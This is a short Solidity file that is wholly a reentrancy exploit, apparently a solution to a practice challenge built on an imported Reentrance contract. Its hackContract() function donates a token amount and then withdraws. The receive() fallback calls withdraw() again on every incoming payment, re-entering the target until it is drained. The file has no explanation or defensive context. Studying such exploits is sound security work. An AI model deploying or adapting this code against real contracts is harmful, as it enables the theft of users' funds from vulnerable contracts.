// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance private reentranceContract;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentranceContract = Reentrance(contractAddress);
    }

    function hackContract() external {
        reentranceContract.donate{value: 1}(address(this));
        withdraw();
    }

    receive() external payable {
        withdraw();
    }

    function withdraw() private {
        reentranceContract.withdraw();
    }
}
